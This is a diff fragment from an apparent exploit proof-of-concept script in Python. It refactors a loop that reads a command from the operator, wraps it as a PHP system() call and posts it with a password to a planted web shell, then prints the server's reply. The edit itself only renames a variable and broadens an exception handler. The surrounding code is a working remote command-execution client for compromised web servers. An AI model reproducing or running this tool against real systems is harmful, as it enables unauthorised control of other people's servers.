@@ -17,15 +17,15 @@ def poc():
                 command = raw_input("[*] input the command:")
                 payload = 'system("%s");' % command
                 if command != "exit":
-                    postData = {
+                    post_data = {
                         password: payload
                     }
-                    r = requests.post(shell, data=postData)
+                    r = requests.post(shell, data=post_data)
                     print(r.text.encode(r.encoding))
                 else:
                     break
             except EOFError as e:
                 print("[*] type 'exit' to quit")
                 pass
-    except (KeyError, IndexError) as e:
+    except Exception:
         print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
